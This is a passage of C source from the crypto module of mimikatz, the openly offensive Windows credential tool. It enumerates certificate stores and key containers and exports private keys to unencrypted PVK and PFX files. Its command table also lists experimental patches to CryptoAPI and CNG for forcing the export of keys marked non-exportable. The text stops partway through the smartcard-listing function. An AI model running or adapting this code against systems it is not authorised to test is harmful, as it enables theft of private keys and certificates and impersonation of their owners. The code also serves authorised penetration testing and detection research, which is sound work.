/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
#include "kuhl_m_crypto.h"

HMODULE
	kuhl_m_crypto_hNCrypt = NULL,
	kuhl_m_crypto_hRsaEnh = NULL;

const KUHL_M_C kuhl_m_c_crypto[] = {
	{kuhl_m_crypto_l_providers,		L"providers",		L"List cryptographic providers"},
	{kuhl_m_crypto_l_stores,		L"stores",			L"List cryptographic stores"},
	{kuhl_m_crypto_l_certificates,	L"certificates",	L"List (or export) certificates"},
	{kuhl_m_crypto_l_keys,			L"keys",			L"List (or export) keys containers"},
	{kuhl_m_crypto_l_sc,			L"sc",				L"List smartcard readers"},
	{kuhl_m_crypto_hash,			L"hash",			L"Hash a password with optional username"},
	{kuhl_m_crypto_system,			L"system",			L"Describe a Windows System Certificate (file, TODO:registry or hive)"},
	{kuhl_m_crypto_c_sc_auth,		L"scauth",			L"Create a authentication certitifate (smartcard like) from a CA"},

	{kuhl_m_crypto_p_capi,			L"capi",			L"[experimental] Patch CryptoAPI layer for easy export"},
	{kuhl_m_crypto_p_cng,			L"cng",				L"[experimental] Patch CNG service for easy export"},
};

const KUHL_M kuhl_m_crypto = {
	L"crypto", L"Crypto Module", NULL,
	ARRAYSIZE(kuhl_m_c_crypto), kuhl_m_c_crypto, kuhl_m_crypto_init, kuhl_m_crypto_clean
};

PCP_EXPORTKEY K_CPExportKey = NULL;
PNCRYPT_OPEN_STORAGE_PROVIDER K_NCryptOpenStorageProvider = NULL;
PNCRYPT_ENUM_KEYS K_NCryptEnumKeys = NULL;
PNCRYPT_OPEN_KEY K_NCryptOpenKey = NULL;
PNCRYPT_IMPORT_KEY K_NCryptImportKey = NULL;
PNCRYPT_EXPORT_KEY K_NCryptExportKey = NULL;
PNCRYPT_GET_PROPERTY K_NCryptGetProperty = NULL;
PNCRYPT_SET_PROPERTY K_NCryptSetProperty = NULL;
PNCRYPT_FREE_BUFFER K_NCryptFreeBuffer = NULL;
PNCRYPT_FREE_OBJECT K_NCryptFreeObject = NULL;
PBCRYPT_ENUM_REGISTERED_PROVIDERS K_BCryptEnumRegisteredProviders = NULL;
PBCRYPT_FREE_BUFFER K_BCryptFreeBuffer = NULL;

NTSTATUS kuhl_m_crypto_init()
{
	NTSTATUS status = STATUS_NOT_FOUND;
	
	if(kuhl_m_crypto_hRsaEnh = LoadLibrary(L"rsaenh"))
	{
		if(K_CPExportKey = (PCP_EXPORTKEY) GetProcAddress(kuhl_m_crypto_hRsaEnh, "CPExportKey"))
		{
			if((MIMIKATZ_NT_MAJOR_VERSION > 5) && !kuhl_m_crypto_hNCrypt)
			{
				if(kuhl_m_crypto_hNCrypt = LoadLibrary(L"ncrypt"))
				{
					K_NCryptOpenStorageProvider = (PNCRYPT_OPEN_STORAGE_PROVIDER) GetProcAddress(kuhl_m_crypto_hNCrypt, "NCryptOpenStorageProvider");
					K_NCryptEnumKeys = (PNCRYPT_ENUM_KEYS) GetProcAddress(kuhl_m_crypto_hNCrypt, "NCryptEnumKeys");
					K_NCryptOpenKey = (PNCRYPT_OPEN_KEY) GetProcAddress(kuhl_m_crypto_hNCrypt, "NCryptOpenKey");
					K_NCryptImportKey = (PNCRYPT_IMPORT_KEY) GetProcAddress(kuhl_m_crypto_hNCrypt, "NCryptImportKey");
					K_NCryptExportKey = (PNCRYPT_EXPORT_KEY) GetProcAddress(kuhl_m_crypto_hNCrypt, "NCryptExportKey");
					K_NCryptGetProperty = (PNCRYPT_GET_PROPERTY) GetProcAddress(kuhl_m_crypto_hNCrypt, "NCryptGetProperty");
					K_NCryptSetProperty = (PNCRYPT_SET_PROPERTY) GetProcAddress(kuhl_m_crypto_hNCrypt, "NCryptSetProperty");
					K_NCryptFreeBuffer = (PNCRYPT_FREE_BUFFER) GetProcAddress(kuhl_m_crypto_hNCrypt, "NCryptFreeBuffer");
					K_NCryptFreeObject = (PNCRYPT_FREE_OBJECT) GetProcAddress(kuhl_m_crypto_hNCrypt, "NCryptFreeObject");
					K_BCryptEnumRegisteredProviders = (PBCRYPT_ENUM_REGISTERED_PROVIDERS) GetProcAddress(kuhl_m_crypto_hNCrypt, "BCryptEnumRegisteredProviders");
					K_BCryptFreeBuffer = (PBCRYPT_FREE_BUFFER) GetProcAddress(kuhl_m_crypto_hNCrypt, "BCryptFreeBuffer");
		
					if(K_NCryptOpenStorageProvider && K_NCryptEnumKeys && K_NCryptOpenKey && K_NCryptImportKey && K_NCryptExportKey && K_NCryptGetProperty && K_NCryptSetProperty && K_NCryptFreeBuffer && K_NCryptFreeObject && K_BCryptEnumRegisteredProviders && K_BCryptFreeBuffer)
						status = STATUS_SUCCESS;
				}
			}
			else status = STATUS_SUCCESS;
		}
	}
	return status;
}

NTSTATUS kuhl_m_crypto_clean()
{
	if(kuhl_m_crypto_hNCrypt)
		if(FreeLibrary(kuhl_m_crypto_hNCrypt))
		{
			K_NCryptOpenStorageProvider = NULL;
			K_NCryptEnumKeys = NULL;
			K_NCryptOpenKey = NULL;
			K_NCryptExportKey = NULL;
			K_NCryptGetProperty = NULL;
			K_NCryptFreeBuffer = NULL;
			K_NCryptFreeObject = NULL;
			K_BCryptEnumRegisteredProviders = NULL;
			K_BCryptFreeBuffer = NULL;
		}
	
	if(kuhl_m_crypto_hRsaEnh)
		if(FreeLibrary(kuhl_m_crypto_hRsaEnh))
			K_CPExportKey = NULL;

	return STATUS_SUCCESS;
}

NTSTATUS kuhl_m_crypto_l_providers(int argc, wchar_t * argv[])
{
	DWORD provType, tailleRequise, index = 0;
	wchar_t * monProvider;
	PCWCHAR name;
	PCRYPT_PROVIDERS pBuffer = NULL;

	kprintf(L"\nCryptoAPI providers :\n");
	while(CryptEnumProviders(index, NULL, 0, &provType, NULL, &tailleRequise))
	{
		if(monProvider = (wchar_t *) LocalAlloc(LPTR, tailleRequise))
		{
			if(CryptEnumProviders(index, NULL, 0, &provType, monProvider, &tailleRequise))
			{
				name = kull_m_crypto_provider_type_to_name(provType);
				kprintf(L"%2u. %-13s (%2u) - %s\n", index, name ? name : L"?", provType, monProvider);
			}
			LocalFree(monProvider);
		}
		index++;
	}
	if(GetLastError() != ERROR_NO_MORE_ITEMS)
		PRINT_ERROR_AUTO(L"CryptEnumProviders");

	index = 0;
	kprintf(L"\nCryptoAPI provider types:\n");
	while(CryptEnumProviderTypes(index, NULL, 0, &provType, NULL, &tailleRequise))
	{
		if(monProvider = (wchar_t *) LocalAlloc(LPTR, tailleRequise))
		{
			if(CryptEnumProviderTypes(index, NULL, 0, &provType, monProvider, &tailleRequise))
			{
				name = kull_m_crypto_provider_type_to_name(provType);
				kprintf(L"%2u. %-13s (%2u) - %s\n", index, name ? name : L"?", provType, monProvider);
			}
			LocalFree(monProvider);
		}
		index++;
	}
	if(GetLastError() != ERROR_NO_MORE_ITEMS)
		PRINT_ERROR_AUTO(L"CryptEnumProviderTypes");

	if(kuhl_m_crypto_hNCrypt)
	{
		kprintf(L"\nCNG providers :\n");
		if(NT_SUCCESS(K_BCryptEnumRegisteredProviders(&tailleRequise, &pBuffer)))
		{
			for(index = 0; index < pBuffer->cProviders; index++)
				kprintf(L"%2u. %s\n", index, pBuffer->rgpszProviders[index]);
			K_BCryptFreeBuffer(pBuffer);
		}
		else PRINT_ERROR_AUTO(L"BCryptEnumRegisteredProviders");
	}
	return STATUS_SUCCESS;
}

NTSTATUS kuhl_m_crypto_l_stores(int argc, wchar_t * argv[])
{
	DWORD dwSystemStore, nbStore = 0;
	PCWCHAR szSystemStore;
	kull_m_string_args_byName(argc, argv, L"systemstore", &szSystemStore, L"CURRENT_USER"/*kuhl_m_crypto_system_stores[0].name*/);
	dwSystemStore = kull_m_crypto_system_store_to_dword(szSystemStore);
	kprintf(L"Asking for System Store \'%s\' (0x%08x)\n", szSystemStore, dwSystemStore);

	if(!CertEnumSystemStore(dwSystemStore, NULL, &nbStore, kuhl_m_crypto_l_stores_enumCallback_print))
		PRINT_ERROR_AUTO(L"CertEnumSystemStore");

	return STATUS_SUCCESS;
}

BOOL WINAPI kuhl_m_crypto_l_stores_enumCallback_print(const void *pvSystemStore, DWORD dwFlags, PCERT_SYSTEM_STORE_INFO pStoreInfo, void *pvReserved, void *pvArg)
{
	kprintf(L"%2u. %s\n", (*((DWORD *) pvArg))++, (wchar_t *) pvSystemStore);
	return TRUE;
}

const DWORD nameSrc[] = {CERT_NAME_FRIENDLY_DISPLAY_TYPE, CERT_NAME_DNS_TYPE, CERT_NAME_EMAIL_TYPE, CERT_NAME_UPN_TYPE, CERT_NAME_URL_TYPE};
NTSTATUS kuhl_m_crypto_l_certificates(int argc, wchar_t * argv[])
{
	HCERTSTORE hCertificateStore;
	PCCERT_CONTEXT pCertContext;
	DWORD i, j, dwSizeNeeded, keySpec, flags = CRYPT_ACQUIRE_ALLOW_NCRYPT_KEY_FLAG;
	wchar_t *certName;
	PCRYPT_KEY_PROV_INFO pBuffer;
	HCRYPTPROV_OR_NCRYPT_KEY_HANDLE monProv;
	HCRYPTKEY maCle;
	BOOL noKey, keyToFree;

	PCWCHAR szSystemStore, szStore, name;
	DWORD dwSystemStore = 0;

	BOOL export = kull_m_string_args_byName(argc, argv, L"export", NULL, NULL);
	if(kull_m_string_args_byName(argc, argv, L"silent", NULL, NULL))
		flags |= CRYPT_ACQUIRE_SILENT_FLAG;
	noKey = kull_m_string_args_byName(argc, argv, L"nokey", NULL, NULL);

	kull_m_string_args_byName(argc, argv, L"systemstore", &szSystemStore, L"CURRENT_USER"/*kuhl_m_crypto_system_stores[0].name*/);
	dwSystemStore = kull_m_crypto_system_store_to_dword(szSystemStore);
	kull_m_string_args_byName(argc, argv, L"store", &szStore, L"My");

	kprintf(L" * System Store  : \'%s\' (0x%08x)\n"
			L" * Store         : \'%s\'\n\n",
			szSystemStore, dwSystemStore,
			szStore);

	if(hCertificateStore = CertOpenStore(CERT_STORE_PROV_SYSTEM, 0, (HCRYPTPROV_LEGACY) NULL, dwSystemStore | CERT_STORE_OPEN_EXISTING_FLAG | CERT_STORE_READONLY_FLAG, szStore))
	{
		for (i = 0, pCertContext = CertEnumCertificatesInStore(hCertificateStore, NULL); pCertContext != NULL; pCertContext = CertEnumCertificatesInStore(hCertificateStore, pCertContext), i++) // implicit CertFreeCertificateContext
		{
			for(j = 0; j < ARRAYSIZE(nameSrc); j++)
			{
				dwSizeNeeded = CertGetNameString(pCertContext, nameSrc[j], 0, NULL, NULL, 0);
				if(dwSizeNeeded > 0)
				{
					if(certName = (wchar_t *) LocalAlloc(LPTR, dwSizeNeeded * sizeof(wchar_t)))
					{
						if(CertGetNameString(pCertContext, nameSrc[j], 0, NULL, certName, dwSizeNeeded) == dwSizeNeeded)
						{
							kprintf(L"%2u. %s\n", i, certName);
							dwSizeNeeded = 0;
							if(CertGetCertificateContextProperty(pCertContext, CERT_KEY_PROV_INFO_PROP_ID, NULL, &dwSizeNeeded))
							{
								if(pBuffer = (PCRYPT_KEY_PROV_INFO) LocalAlloc(LPTR, dwSizeNeeded))
								{
									if(CertGetCertificateContextProperty(pCertContext, CERT_KEY_PROV_INFO_PROP_ID, pBuffer, &dwSizeNeeded))
									{
										name = kull_m_crypto_provider_type_to_name(pBuffer->dwProvType);
										kprintf(
											L"\tKey Container  : %s\n"
											L"\tProvider       : %s\n"
											L"\tProvider type  : %s (%u)\n",
											(pBuffer->pwszContainerName ? pBuffer->pwszContainerName : L"(null)"),
											(pBuffer->pwszProvName ? pBuffer->pwszProvName : L"(null)"),
											name ? name : L"?", pBuffer->dwProvType);
										
										if(!noKey)
										{
											if(CryptAcquireCertificatePrivateKey(pCertContext, flags, NULL, &monProv, &keySpec, &keyToFree))
											{
												kprintf(L"\tType           : %s (0x%08x)\n", kull_m_crypto_keytype_to_str(keySpec), keySpec);

												if(keySpec != CERT_NCRYPT_KEY_SPEC)
												{
													if(CryptGetUserKey(monProv, keySpec, &maCle))
													{
														kuhl_m_crypto_printKeyInfos(0, maCle);
														CryptDestroyKey(maCle);
													}
													else PRINT_ERROR_AUTO(L"CryptGetUserKey");

													if(keyToFree)
														CryptReleaseContext(monProv, 0);
												}
												else if(kuhl_m_crypto_hNCrypt)
												{
													kuhl_m_crypto_printKeyInfos(monProv, 0);
													if(keyToFree)
														K_NCryptFreeObject(monProv);
												}
												else PRINT_ERROR(L"keySpec == CERT_NCRYPT_KEY_SPEC without CNG Handle ?\n");

											} else PRINT_ERROR_AUTO(L"CryptAcquireCertificatePrivateKey");
										}
									} else PRINT_ERROR_AUTO(L"CertGetCertificateContextProperty");
									LocalFree(pBuffer);
								}
								if(!export)
									kprintf(L"\n");
							}

							if(export)
								kuhl_m_crypto_exportCert(pCertContext, (BOOL) dwSizeNeeded, szSystemStore, szStore, i, certName);

						} else PRINT_ERROR_AUTO(L"CertGetNameString");
						LocalFree(certName);
					}
					break;
				} else PRINT_ERROR_AUTO(L"CertGetNameString (for len)");	
			}
		}
		CertCloseStore(hCertificateStore, CERT_CLOSE_STORE_FORCE_FLAG);
	} else PRINT_ERROR_AUTO(L"CertOpenStore");

	return STATUS_SUCCESS;
}

void kuhl_m_crypto_l_keys_capi(LPCWSTR szContainer, LPCWSTR szProvider, DWORD dwProvType, DWORD dwFlags, BOOL export, LPCWSTR szStore)
{
	HCRYPTPROV hCryptProv, hCryptKeyProv;
	HCRYPTKEY hCapiKey;
	DWORD i, dwSizeNeeded, dwUniqueSizeNeeded, ks, CRYPT_first_next = CRYPT_FIRST, dwContainer = szContainer ? (DWORD) wcslen(szContainer) : 0, dwSubContainer;
	BOOL success;
	char *aContainerName, *aUniqueName;
	wchar_t *containerName, *fullContainer;

	if(CryptAcquireContext(&hCryptProv, szContainer, szProvider, dwProvType, CRYPT_VERIFYCONTEXT | dwFlags))
	{
		success = CryptGetProvParam(hCryptProv, PP_ENUMCONTAINERS, NULL, &dwSizeNeeded, CRYPT_first_next);
		if(aContainerName = (char *) LocalAlloc(LPTR, dwSizeNeeded))
		{
			i = 0;
			while(success)
			{
				if(success = (CryptGetProvParam(hCryptProv, PP_ENUMCONTAINERS, (BYTE *) aContainerName, &dwSizeNeeded, CRYPT_first_next)))
				{
					if(containerName = kull_m_string_qad_ansi_to_unicode(aContainerName))
					{
						kprintf(L"\n%2u. %s\n", i,  containerName);
						dwSubContainer = (DWORD) wcslen(containerName);

						if(fullContainer = (wchar_t *) LocalAlloc(LPTR, (dwContainer + dwSubContainer + 1) * sizeof(wchar_t)))
						{
							if(dwContainer)
								RtlCopyMemory(fullContainer, szContainer, dwContainer * sizeof(wchar_t));
							RtlCopyMemory(fullContainer + dwContainer, containerName, dwSubContainer * sizeof(wchar_t));

							if(CryptAcquireContext(&hCryptKeyProv, fullContainer, szProvider, dwProvType, dwFlags))
							{
								if(CryptGetProvParam(hCryptKeyProv, PP_UNIQUE_CONTAINER, NULL, &dwUniqueSizeNeeded, 0))
								{
									if(aUniqueName = (char *) LocalAlloc(LPTR, dwUniqueSizeNeeded))
									{
										if(CryptGetProvParam(hCryptKeyProv, PP_UNIQUE_CONTAINER, (BYTE *) aUniqueName, &dwUniqueSizeNeeded, 0))
											kprintf(L"    %S\n", aUniqueName);
										LocalFree(aUniqueName);
									}
								}

								for(ks = AT_KEYEXCHANGE, hCapiKey = 0; (ks <= AT_SIGNATURE) && !CryptGetUserKey(hCryptKeyProv, ks, &hCapiKey); ks++);
								if(hCapiKey)
								{
									kprintf(L"\tType           : %s (0x%08x)\n", kull_m_crypto_keytype_to_str(ks), ks);
									kuhl_m_crypto_printKeyInfos(0, hCapiKey);
									if(export)
										kuhl_m_crypto_exportKeyToFile(0, hCapiKey, ks, szStore, i, containerName);
									CryptDestroyKey(hCapiKey);
								}
								else PRINT_ERROR_AUTO(L"CryptGetUserKey");
							}
							LocalFree(fullContainer);
						}
						LocalFree(containerName);
					}
				}
				CRYPT_first_next = CRYPT_NEXT;
				i++;
			}
			if(GetLastError() != ERROR_NO_MORE_ITEMS)
				PRINT_ERROR_AUTO(L"CryptGetProvParam");

			CryptReleaseContext(hCryptProv, 0);
			LocalFree(aContainerName);
		}
	}
	else PRINT_ERROR_AUTO(L"CryptAcquireContext");
}

NTSTATUS kuhl_m_crypto_l_keys(int argc, wchar_t * argv[])
{
	NCRYPT_PROV_HANDLE hProvider;
	NCryptKeyName * pKeyName;
	PVOID pEnumState = NULL;
	SECURITY_STATUS retour;
	NCRYPT_KEY_HANDLE hCngKey;
	DWORD i, dwUniqueSizeNeeded;
	wchar_t *uUniqueName;
	
	PCWCHAR szProvider, pProvider, szProviderType, szStore, szCngProvider/*, pCngProvider*/;
	DWORD dwProviderType, dwFlags = 0;
	
	BOOL export = kull_m_string_args_byName(argc, argv, L"export", NULL, NULL);
	
	kull_m_string_args_byName(argc, argv, L"provider", &szProvider, L"MS_ENHANCED_PROV");
	if(!(pProvider = kull_m_crypto_provider_to_realname(szProvider)))
		pProvider = szProvider;
	
	kull_m_string_args_byName(argc, argv, L"providertype", &szProviderType, L"PROV_RSA_FULL");
	if(!(dwProviderType = kull_m_crypto_provider_type_to_dword(szProviderType)))
		dwProviderType = wcstoul(szProviderType, NULL, 0);

	if(kull_m_string_args_byName(argc, argv, L"machine", NULL, NULL))
		dwFlags = CRYPT_MACHINE_KEYSET; // same as NCRYPT_MACHINE_KEY_FLAG :)
	szStore = dwFlags ? L"machine" : L"user";
	
	if(kull_m_string_args_byName(argc, argv, L"silent", NULL, NULL))
		dwFlags |= CRYPT_SILENT;

	kull_m_string_args_byName(argc, argv, L"cngprovider", &szCngProvider, MS_KEY_STORAGE_PROVIDER);

	kprintf(L" * Store         : \'%s\'\n"	
			L" * Provider      : \'%s\' (\'%s\')\n"
			L" * Provider type : \'%s\' (%u)\n"
			L" * CNG Provider  : \'%s\'\n",
			szStore,
			szProvider, pProvider,
			szProviderType, dwProviderType,
			szCngProvider);

	kprintf(L"\nCryptoAPI keys :\n");
	kuhl_m_crypto_l_keys_capi(NULL, pProvider, dwProviderType, dwFlags, export, szStore);

	if(kuhl_m_crypto_hNCrypt)
	{
		kprintf(L"\nCNG keys :\n");

		if(NT_SUCCESS(retour = K_NCryptOpenStorageProvider(&hProvider, szCngProvider, 0)))
		{
			i = 0;
			while(NT_SUCCESS(retour = K_NCryptEnumKeys(hProvider, NULL, &pKeyName, &pEnumState, dwFlags)))
			{
				kprintf(L"\n%2u. %s\n", i,  pKeyName->pszName);

				if(NT_SUCCESS(retour = K_NCryptOpenKey(hProvider, &hCngKey, pKeyName->pszName, 0, dwFlags)))
				{
					if(NT_SUCCESS(K_NCryptGetProperty(hCngKey, NCRYPT_UNIQUE_NAME_PROPERTY, NULL, 0, &dwUniqueSizeNeeded, 0)))
					{
						if(uUniqueName = (wchar_t *) LocalAlloc(LPTR, dwUniqueSizeNeeded))
						{
							if(NT_SUCCESS(K_NCryptGetProperty(hCngKey, NCRYPT_UNIQUE_NAME_PROPERTY, (BYTE *) uUniqueName, dwUniqueSizeNeeded, &dwUniqueSizeNeeded, 0)))
								kprintf(L"    %s\n", uUniqueName);
							LocalFree(uUniqueName);
						}
					}
					kuhl_m_crypto_printKeyInfos(hCngKey, 0);
					if(export)
						kuhl_m_crypto_exportKeyToFile(hCngKey, 0, AT_KEYEXCHANGE, szStore, i, pKeyName->pszName);
					K_NCryptFreeObject(hCngKey);
				}
				else PRINT_ERROR(L"NCryptOpenKey %08x\n", retour);

				K_NCryptFreeBuffer(pKeyName);
				i++;
			}
			if(retour != NTE_NO_MORE_ITEMS)
				PRINT_ERROR(L"NCryptEnumKeys %08x\n", retour);

			if(pEnumState)
				K_NCryptFreeBuffer(pEnumState);
			K_NCryptFreeObject(hProvider);
		}
		else PRINT_ERROR(L"NCryptOpenStorageProvider %08x\n", retour);
	}

	return STATUS_SUCCESS;
}

void kuhl_m_crypto_printKeyInfos(HCRYPTPROV_OR_NCRYPT_KEY_HANDLE monProv, HCRYPTKEY maCle)
{
	BOOL isExportable, keyOperation = FALSE;
	DWORD keySize, dwSizeNeeded;
	if(monProv)
	{
		keyOperation = NT_SUCCESS(K_NCryptGetProperty(monProv, NCRYPT_EXPORT_POLICY_PROPERTY, (BYTE *) &keySize, sizeof(DWORD), &dwSizeNeeded, 0));
		isExportable = (keySize & NCRYPT_ALLOW_EXPORT_FLAG);
		keyOperation &= NT_SUCCESS(K_NCryptGetProperty(monProv, NCRYPT_LENGTH_PROPERTY,  (BYTE *) &keySize, sizeof(DWORD), &dwSizeNeeded, 0));

		if(!keyOperation)
			PRINT_ERROR_AUTO(L"NCryptGetProperty");
	}
	else if(maCle)
	{
		dwSizeNeeded = sizeof(DWORD);
		keyOperation = CryptGetKeyParam(maCle, KP_PERMISSIONS, (BYTE *) &keySize, &dwSizeNeeded, 0);
		isExportable = (keySize & CRYPT_EXPORT);

		dwSizeNeeded = sizeof(DWORD);
		keyOperation &= CryptGetKeyParam(maCle, KP_KEYLEN, (BYTE *) &keySize, &dwSizeNeeded, 0);

		if(!keyOperation)
			PRINT_ERROR_AUTO(L"CryptGetKeyParam");
	}

	if(keyOperation)
		kprintf(
		L"\tExportable key : %s\n"
		L"\tKey size       : %u\n",
		(isExportable ? L"YES" : L"NO"), keySize);
}

void kuhl_m_crypto_exportRawKeyToFile(LPCVOID data, DWORD size, BOOL isCNG, const wchar_t * store, const DWORD index, const wchar_t * name, BOOL wantExport, BOOL wantInfos)
{
	BOOL status = FALSE;
	NCRYPT_PROV_HANDLE hCngProv = 0;
	NCRYPT_KEY_HANDLE hCngKey = 0;
	DWORD exportPolicy = NCRYPT_ALLOW_EXPORT_FLAG | NCRYPT_ALLOW_PLAINTEXT_EXPORT_FLAG;
	HCRYPTPROV hCapiProv = 0;
	HCRYPTKEY hCapiKey = 0;

	if(isCNG)
	{
		if(kuhl_m_crypto_hNCrypt)
		{
			if(NT_SUCCESS(K_NCryptOpenStorageProvider(&hCngProv, MS_KEY_STORAGE_PROVIDER, 0)))
			{
				if(NT_SUCCESS(K_NCryptImportKey(hCngProv, 0, BCRYPT_RSAPRIVATE_BLOB, NULL, &hCngKey, (PBYTE) data, size, 0)))
				{
					if(!NT_SUCCESS(K_NCryptSetProperty(hCngKey, NCRYPT_EXPORT_POLICY_PROPERTY, (PBYTE) &exportPolicy, sizeof(DWORD), 0)))
						PRINT_ERROR(L"NCryptSetProperty\n");
				}
				else PRINT_ERROR(L"NCryptImportKey\n");
			}
		}
		else PRINT_ERROR(L"No CNG!\n");
	}
	else
	{
		if(CryptAcquireContext(&hCapiProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT))
		{
			if(!CryptImportKey(hCapiProv, (LPCBYTE) data, size, 0, CRYPT_EXPORTABLE, &hCapiKey))
				PRINT_ERROR_AUTO(L"CryptImportKey");
		}
	}

	if(hCngKey || hCapiKey)
	{
		if(wantInfos)
			kuhl_m_crypto_printKeyInfos(hCngKey, hCapiKey);
		if(wantExport)
			kuhl_m_crypto_exportKeyToFile(hCngKey, hCapiKey, AT_KEYEXCHANGE, store, 0, name);
		if(hCngKey)
			K_NCryptFreeObject(hCngKey);
		if(hCapiKey)
			CryptDestroyKey(hCapiKey);
	}

	if(hCngProv)
		K_NCryptFreeObject(hCngProv);
	if(hCapiProv)
		CryptReleaseContext(hCapiProv, 0);
}

void kuhl_m_crypto_exportKeyToFile(NCRYPT_KEY_HANDLE hCngKey, HCRYPTKEY hCapiKey, DWORD keySpec, const wchar_t * store, const DWORD index, const wchar_t * name)
{
	BOOL isExported = FALSE;
	DWORD szExport, szPVK;
	PBYTE pExport = NULL;
	SECURITY_STATUS nCryptReturn;
	PVK_FILE_HDR pvkHeader = {PVK_MAGIC, PVK_FILE_VERSION_0, keySpec, PVK_NO_ENCRYPT, 0, 0};
	PCWCHAR provType = hCngKey ? L"cng" : L"capi";
	PWCHAR filenamebuffer;

	if(filenamebuffer = kuhl_m_crypto_generateFileName(store, provType, index, name, L"pvk"))
	{
		if(hCapiKey)
		{
			if(CryptExportKey(hCapiKey, 0, PRIVATEKEYBLOB, 0, NULL, &szExport))
			{
				szPVK = szExport + sizeof(PVK_FILE_HDR);
				if(pExport = (PBYTE) LocalAlloc(LPTR, szPVK))
				{
					if(!CryptExportKey(hCapiKey, 0, PRIVATEKEYBLOB, 0, pExport + sizeof(PVK_FILE_HDR), &szExport))
						pExport = (PBYTE) LocalFree(pExport);
				}
			}
		}
		else if(hCngKey)
		{
			nCryptReturn = K_NCryptExportKey(hCngKey, 0, LEGACY_RSAPRIVATE_BLOB, NULL, NULL, 0, &szExport, 0);
			if(nCryptReturn == ERROR_SUCCESS)
			{
				szPVK = szExport + sizeof(PVK_FILE_HDR);
				if(pExport = (PBYTE) LocalAlloc(LPTR, szPVK))
				{
					nCryptReturn = K_NCryptExportKey(hCngKey, 0, LEGACY_RSAPRIVATE_BLOB, NULL, pExport + sizeof(PVK_FILE_HDR), szExport, &szExport, 0);
					if(nCryptReturn != ERROR_SUCCESS)
						pExport = (PBYTE) LocalFree(pExport);
				}
			}
			SetLastError(nCryptReturn);
		}

		if(pExport)
		{
			pvkHeader.cbPvk = szExport;
			RtlCopyMemory(pExport, &pvkHeader, sizeof(PVK_FILE_HDR));
			isExported = kull_m_file_writeData(filenamebuffer, pExport, szPVK);
			LocalFree(pExport);
		}

		kprintf(L"\tPrivate export : %s - ", isExported ? L"OK" : L"KO");
		if(isExported)
			kprintf(L"\'%s\'\n", filenamebuffer);
		else
			PRINT_ERROR_AUTO(L"Export / CreateFile");
	}
	else
		PRINT_ERROR_AUTO(L"kuhl_m_crypto_generateFileName");
}

void kuhl_m_crypto_exportCert(PCCERT_CONTEXT pCertificate, BOOL havePrivateKey, const wchar_t * systemStore, const wchar_t * store, const DWORD index, const wchar_t * name)
{
	wchar_t *fileNameBuffer;
	BOOL isExported;
	HCERTSTORE hTempStore = CertOpenStore(CERT_STORE_PROV_MEMORY, 0, 0, CERT_STORE_CREATE_NEW_FLAG, NULL); 
	PCCERT_CONTEXT  pCertContextCopy = NULL;
	CRYPT_DATA_BLOB bDataBlob = {0, NULL};

	if(fileNameBuffer = kuhl_m_crypto_generateFileName(systemStore, store, index, name, L"der"))
	{
		isExported = kull_m_file_writeData(fileNameBuffer, pCertificate->pbCertEncoded, pCertificate->cbCertEncoded);
		kprintf(L"\tPublic export  : %s - ", isExported ? L"OK" : L"KO");
		if(isExported)
			kprintf(L"\'%s\'\n", fileNameBuffer);
		else PRINT_ERROR_AUTO(L"CreateFile");
		LocalFree(fileNameBuffer);
	}
	else PRINT_ERROR_AUTO(L"kuhl_m_crypto_generateFileName");
	
	if(havePrivateKey)
	{
		if(fileNameBuffer = kuhl_m_crypto_generateFileName(systemStore, store, index, name, L"pfx"))
		{
			isExported = FALSE;
			if(CertAddCertificateContextToStore(hTempStore, pCertificate, CERT_STORE_ADD_NEW, &pCertContextCopy))
			{
				isExported = kull_m_crypto_exportPfx(hTempStore, fileNameBuffer);
				CertFreeCertificateContext(pCertContextCopy);
			}
			kprintf(L"\tPrivate export : %s - ", isExported ? L"OK" : L"KO");
			if(isExported)
				kprintf(L"\'%s\'\n", fileNameBuffer);
			else PRINT_ERROR_AUTO(L"Export / CreateFile");
			LocalFree(fileNameBuffer);
		}
		else PRINT_ERROR_AUTO(L"kuhl_m_crypto_generateFileName");
	}
	kprintf(L"\n");
	CertCloseStore(hTempStore, CERT_CLOSE_STORE_FORCE_FLAG);
}

wchar_t * kuhl_m_crypto_generateFileName(const wchar_t * term0, const wchar_t * term1, const DWORD index, const wchar_t * name, const wchar_t * ext)
{
	wchar_t * buffer;
	size_t charCount = wcslen(term0) + 1 + wcslen(term1) + 1 + 10 + 1 + wcslen(name) + 1 + wcslen(ext) + 1;

	if(buffer = (wchar_t *) LocalAlloc(LPTR, (charCount) * sizeof(wchar_t)))
	{
		if(swprintf_s(buffer, charCount, L"%s_%s_%u_%s.%s", term0, term1, index, name, ext) == -1)
			buffer = (wchar_t *) LocalFree(buffer);
		else
			kull_m_file_cleanFilename(buffer);
	}
	return buffer;
}

DWORD kuhl_m_crypto_l_sc_provtypefromname(LPCWSTR szProvider)
{
	DWORD result = 0, provType, tailleRequise, index = 0;
	wchar_t * monProvider;
	for(index = 0, result = 0; !result && CryptEnumProviders(index, NULL, 0, &provType, NULL, &tailleRequise); index++)
	{
		if(monProvider = (wchar_t *) LocalAlloc(LPTR, tailleRequise))
		{
			if(CryptEnumProviders(index, NULL, 0, &provType, monProvider, &tailleRequise))
				if(_wcsicmp(szProvider, monProvider) == 0)
					result = provType;
			LocalFree(monProvider);
		}
	}
	if(!result && GetLastError() != ERROR_NO_MORE_ITEMS)
		PRINT_ERROR_AUTO(L"CryptEnumProviders");
	return provType;
}

PWSTR kuhl_m_crypto_l_sc_containerFromReader(LPCWSTR reader)
{
	PWSTR result = NULL;
	DWORD szReader = (DWORD) wcslen(reader);
	if(result = (PWSTR) LocalAlloc(LPTR, (szReader + 6) * sizeof(wchar_t)))
	{
		RtlCopyMemory(result, L"\\\\.\\", 4 * sizeof(wchar_t));
		RtlCopyMemory(result + 4, reader, szReader * sizeof(wchar_t));
		RtlCopyMemory(result + 4 + szReader, L"\\", 1 * sizeof(wchar_t));
	}
	return result;
}

NTSTATUS kuhl_m_crypto_l_sc(int argc, wchar_t * argv[])
{
	SCARDCONTEXT hContext;
	SCARDHANDLE hCard;
	BYTE atr[16];
	LONG status;
	LPWSTR mszReaders = NULL, pReader, mszCards = NULL, pCard, szProvider = NULL, szContainer;
	DWORD dwLen = SCARD_AUTOALLOCATE, dwActiveProtocol, dwProvType;
	
	status = SCardEstablishContext(SCARD_SCOPE_SYSTEM, NULL, NULL, &hContext);
	if(status == SCARD_S_SUCCESS)
	{
